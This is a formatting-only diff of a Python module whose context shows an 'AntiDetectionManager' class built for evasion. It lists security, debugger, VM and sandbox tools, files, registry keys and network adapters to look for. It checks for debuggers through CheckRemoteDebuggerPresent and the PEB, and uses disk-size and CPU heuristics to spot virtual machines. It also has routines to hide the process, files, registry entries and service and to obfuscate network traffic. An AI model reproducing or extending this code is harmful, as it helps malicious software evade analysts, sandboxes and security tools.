@@ -21,6 +21,7 @@ def _get_psutil():
         ) from exc
     return _ps
 
+
 if platform.system() == "Windows":
     try:
         import win32api  # type: ignore
@@ -50,6 +51,7 @@ else:
     win32serviceutil = None  # type: ignore[assignment]
     win32timezone = None  # type: ignore[assignment]
 
+
 class AntiDetectionManager:
     """Advanced anti-detection and evasion techniques."""
 
@@ -57,20 +59,52 @@ class AntiDetectionManager:
         self.detection_indicators = {
             "processes": [
                 # Security Tools
-                "wireshark", "procmon", "proc_analyzer", "sysinspector",
-                "process_hacker", "autoit", "pestudio", "wireshark",
-                "nmap", "nmap-zenmap", "tcpdump", "netstat", "wmic",
-                "tasklist", "taskmgr", "procexp", "procexp64",
+                "wireshark",
+                "procmon",
+                "proc_analyzer",
+                "sysinspector",
+                "process_hacker",
+                "autoit",
+                "pestudio",
+                "wireshark",
+                "nmap",
+                "nmap-zenmap",
+                "tcpdump",
+                "netstat",
+                "wmic",
+                "tasklist",
+                "taskmgr",
+                "procexp",
+                "procexp64",
                 # Analysis Tools
-                "ollydbg", "x64dbg", "windbg", "immunity", "ida",
-                "ida64", "radare2", "ghidra", "cutter", "x32dbg",
+                "ollydbg",
+                "x64dbg",
+                "windbg",
+                "immunity",
+                "ida",
+                "ida64",
+                "radare2",
+                "ghidra",
+                "cutter",
+                "x32dbg",
                 # VM Tools
-                "vmwaretray", "vmwareuser", "vboxservice", "vmtoolsd",
-                "vmwareuser.exe", "vmwaretray.exe", "vmware.exe",
-                "vmwareuser.exe", "vmwaretray.exe", "vmware.exe",
+                "vmwaretray",
+                "vmwareuser",
+                "vboxservice",
+                "vmtoolsd",
+                "vmwareuser.exe",
+                "vmwaretray.exe",
+                "vmware.exe",
+                "vmwareuser.exe",
+                "vmwaretray.exe",
+                "vmware.exe",
                 # Sandbox Tools
-                "sandboxie", "sandboxie-control", "sandboxie-rpcss",
-                "sandboxie-dcom", "sandboxie-winlogon", "sandboxie-sbie"
+                "sandboxie",
+                "sandboxie-control",
+                "sandboxie-rpcss",
+                "sandboxie-dcom",
+                "sandboxie-winlogon",
+                "sandboxie-sbie",
             ],
             "files": [
                 # VM Files
@@ -87,7 +121,7 @@ class AntiDetectionManager:
                 # Sandbox Files
                 "C:\\Program Files\\Sandboxie",
                 "C:\\Program Files\\Sandboxie-Plus",
-                "C:\\Program Files\\Sandboxie-Classic"
+                "C:\\Program Files\\Sandboxie-Classic",
             ],
             "registry_keys": [
                 # VM Keys
@@ -101,12 +135,17 @@ class AntiDetectionManager:
                 # Sandbox Keys
                 "SOFTWARE\\Sandboxie",
                 "SOFTWARE\\Sandboxie-Plus",
-                "SOFTWARE\\Sandboxie-Classic"
+                "SOFTWARE\\Sandboxie-Classic",
             ],
             "network_adapters": [
-                "VMware", "VirtualBox", "VBox", "Virtual", "VMnet",
-                "VMware Network Adapter", "VirtualBox Host-Only"
-            ]
+                "VMware",
+                "VirtualBox",
+                "VBox",
+                "Virtual",
+                "VMnet",
+                "VMware Network Adapter",
+                "VirtualBox Host-Only",
+            ],
         }
 
     def check_environment(self) -> Dict[str, bool]:
@@ -123,7 +162,7 @@ class AntiDetectionManager:
             "security_tools_detected": self._check_security_tools(),
             "analysis_tools_detected": self._check_analysis_tools(),
             "network_monitoring_detected": self._check_network_monitoring(),
-            "system_anomalies_detected": self._check_system_anomalies()
+            "system_anomalies_detected": self._check_system_anomalies(),
         }
 
         return results
@@ -136,7 +175,7 @@ class AntiDetectionManager:
             self._check_sandbox_registry(),
             self._check_sandbox_network(),
             self._check_sandbox_memory(),
-            self._check_sandbox_cpu()
+            self._check_sandbox_cpu(),
         ]
         return any(checks)
 
@@ -148,7 +187,7 @@ class AntiDetectionManager:
             self._check_vm_registry(),
             self._check_vm_hardware(),
             self._check_vm_network(),
-            self._check_vm_memory()
+            self._check_vm_memory(),
         ]
         return any(checks)
 
@@ -159,7 +198,7 @@ class AntiDetectionManager:
             self._check_debugger_processes(),
             self._check_debugger_registry(),
             self._check_debugger_memory(),
-            self._check_debugger_timing()
+            self._check_debugger_timing(),
         ]
         return any(checks)
 
@@ -170,7 +209,7 @@ class AntiDetectionManager:
             self._check_security_files(),
             self._check_security_registry(),
             self._check_security_network(),
-            self._check_security_services()
+            self._check_security_services(),
         ]
         return any(checks)
 
@@ -181,7 +220,7 @@ class AntiDetectionManager:
             self._check_analysis_files(),
             self._check_analysis_registry(),
             self._check_analysis_network(),
-            self._check_analysis_services()
+            self._check_analysis_services(),
         ]
         return any(checks)
 
@@ -192,7 +231,7 @@ class AntiDetectionManager:
             self._check_network_files(),
             self._check_network_registry(),
             self._check_network_adapters(),
-            self._check_network_services()
+            self._check_network_services(),
         ]
         return any(checks)
 
@@ -203,7 +242,7 @@ class AntiDetectionManager:
             self._check_cpu_anomalies(),
             self._check_disk_anomalies(),
             self._check_network_anomalies(),
-            self._check_process_anomalies()
+            self._check_process_anomalies(),
         ]
         return any(checks)
 
@@ -217,8 +256,7 @@ class AntiDetectionManager:
             # Check for debugger using CheckRemoteDebuggerPresent
             isDebuggerPresent = ctypes.c_bool()
             ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
-                ctypes.windll.kernel32.GetCurrentProcess(),
-                ctypes.byref(isDebuggerPresent)
+                ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(isDebuggerPresent)
             )
             if isDebuggerPresent.value:
                 return True
@@ -230,7 +268,7 @@ class AntiDetectionManager:
                     ("PebBaseAddress", ctypes.c_void_p),
                     ("Reserved2", ctypes.c_void_p * 2),
                     ("UniqueProcessId", ctypes.c_void_p),
-                    ("Reserved3", ctypes.c_void_p)
+                    ("Reserved3", ctypes.c_void_p),
                 ]
 
             pbi = PROCESS_BASIC_INFORMATION()
@@ -239,7 +277,7 @@ class AntiDetectionManager:
                 0,  # ProcessBasicInformation
                 ctypes.byref(pbi),
                 ctypes.sizeof(pbi),
-                None
+                None,
             )
 
             if status == 0:
@@ -251,7 +289,7 @@ class AntiDetectionManager:
                     ctypes.c_void_p(peb.value + 2),
                     ctypes.byref(being_debugged),
                     1,
-                    None
+                    None,
                 )
                 if being_debugged.value:
                     return True
@@ -287,7 +325,7 @@ class AntiDetectionManager:
             psutil = _get_psutil()
             # Check CPU vendor
             cpu_info = platform.processor().lower()
-            vm_vendors = ['vmware', 'virtualbox', 'qemu', 'virtual']
+            vm_vendors = ["vmware", "virtualbox", "qemu", "virtual"]
             if any(vendor in cpu_info for vendor in vm_vendors):
                 return True
 
@@ -301,7 +339,7 @@ class AntiDetectionManager:
                 return True
 
             # Check disk size
-            disk = psutil.disk_usage('/')
+            disk = psutil.disk_usage("/")
             if disk.total < 20 * 1024 * 1024 * 1024:  # Less than 20GB
                 return True
 
@@ -357,7 +395,7 @@ class AntiDetectionManager:
         try:
             psutil = _get_psutil()
             # Check for disk size anomalies
-            disk = psutil.disk_usage('/')
+            disk = psutil.disk_usage("/")
             if disk.total < 10 * 1024 * 1024 * 1024:  # Less than 10GB
                 return True
 
@@ -407,13 +445,13 @@ class AntiDetectionManager:
                 return True
 
             # Check for process name anomalies
-            for proc in psutil.process_iter(['name']):
-                if proc.info['name'].lower() in ['system', 'svchost.exe']:
+            for proc in psutil.process_iter(["name"]):
+                if proc.info["name"].lower() in ["system", "svchost.exe"]:
                     return True
 
             # Check for process CPU usage anomalies
-            for proc in psutil.process_iter(['cpu_percent']):
-                if proc.info['cpu_percent'] > 90:  # High CPU usage
+            for proc in psutil.process_iter(["cpu_percent"]):
+                if proc.info["cpu_percent"] > 90:  # High CPU usage
                     return True
 
             return False
@@ -433,7 +471,7 @@ class AntiDetectionManager:
             "network_obfuscated": self._obfuscate_network(),
             "files_hidden": self._hide_files(),
             "registry_hidden": self._hide_registry(),
-            "service_hidden": self._hide_service()
+            "service_hidden": self._hide_service(),
         }
 
         return results
@@ -442,9 +480,7 @@ class AntiDetectionManager:
         """Hide process from task manager and other tools."""
         try:
             # Modify process token
-            process_handle = win32api.OpenProcess(
-                win32con.PROCESS_ALL_ACCESS, False, os.getpid()
-            )
+            process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
             tok_flags = win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
             token_handle = win32security.OpenProcessToken(process_handle, tok_flags)
 
@@ -477,7 +513,7 @@ class AntiDetectionManager:
                 ctypes.c_void_p(address),
                 size,
                 win32con.PAGE_EXECUTE_READ,
-                ctypes.byref(old_protect)
+                ctypes.byref(old_protect),
             )
 
             # 2. Implement memory encryption
@@ -551,15 +587,12 @@ class AntiDetectionManager:
                 None,
                 4096,  # Page size
                 win32con.MEM_COMMIT | win32con.MEM_RESERVE,
-                win32con.PAGE_READONLY
+                win32con.PAGE_READONLY,
             )
 
             # Add guard page after protected region
             guard_after = ctypes.windll.kernel32.VirtualAlloc(
-                None,
-                4096,
-                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
-                win32con.PAGE_READONLY
+                None, 4096, win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_READONLY
             )
 
             # Set up guard page handlers
@@ -594,7 +627,7 @@ class AntiDetectionManager:
                     ("RegionSize", ctypes.c_size_t),
                     ("State", ctypes.c_ulong),
                     ("Protect", ctypes.c_ulong),
-                    ("Type", ctypes.c_ulong)
+                    ("Type", ctypes.c_ulong),
                 ]
 
             mbi = MEMORY_BASIC_INFORMATION()
@@ -603,9 +636,7 @@ class AntiDetectionManager:
             def monitor_thread():
                 while True:
                     ctypes.windll.kernel32.VirtualQuery(
-                        ctypes.c_void_p(address),
-                        ctypes.byref(mbi),
-                        ctypes.sizeof(mbi)
+                        ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)
                     )
 
                     # Check for suspicious access patterns
@@ -616,6 +647,7 @@ class AntiDetectionManager:
 
             # Start monitoring thread
             import threading
+
             monitor_thread = threading.Thread(target=monitor_thread, daemon=True)
             monitor_thread.start()
         except Exception as e:
@@ -633,17 +665,14 @@ class AntiDetectionManager:
                     ("RegionSize", ctypes.c_size_t),
                     ("State", ctypes.c_ulong),
                     ("Protect", ctypes.c_ulong),
-                    ("Type", ctypes.c_ulong)
+                    ("Type", ctypes.c_ulong),
                 ]
 
             # Randomize memory allocation
             for _ in range(10):  # Create random allocations
                 size = random.randint(4096, 1024 * 1024)  # Random size between 4KB and 1MB
                 address = ctypes.windll.kernel32.VirtualAlloc(
-                    None,
-                    size,
-                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
-                    win32con.PAGE_READWRITE
+                    None, size, win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_READWRITE
                 )
 
                 # Fill with random data
@@ -675,6 +704,7 @@ class AntiDetectionManager:
 
             # Calculate checksum using SHA-256
             import hashlib
+
             return hashlib.sha256(data.raw).digest()
         except Exception as e:
             logger.error(f"Error calculating memory checksum: {e}")
@@ -683,6 +713,7 @@ class AntiDetectionManager:
     def _start_integrity_monitor(self, address: int, size: int) -> None:
         """Start periodic memory integrity monitoring."""
         try:
+
             def monitor_thread():
                 while True:
                     current_checksum = self._calculate_memory_checksum(address, size)
@@ -691,6 +722,7 @@ class AntiDetectionManager:
                     time.sleep(1)  # Check every second
 
             import threading
+
             monitor_thread = threading.Thread(target=monitor_thread, daemon=True)
             monitor_thread.start()
         except Exception as e:
@@ -730,7 +762,7 @@ class AntiDetectionManager:
                 ctypes.c_void_p(address),
                 4096,  # Page size
                 win32con.PAGE_NOACCESS,
-                ctypes.byref(old_protect)
+                ctypes.byref(old_protect),
             )
 
             # 2. Trigger security alerts
@@ -744,7 +776,7 @@ class AntiDetectionManager:
     def _restore_memory_backup(self, address: int) -> None:
         """Restore memory from backup if available."""
         try:
-            if hasattr(self, '_memory_backup'):
+            if hasattr(self, "_memory_backup"):
                 # Restore from backup
                 h_process = ctypes.windll.kernel32.GetCurrentProcess()
                 ctypes.windll.kernel32.WriteProcessMemory(
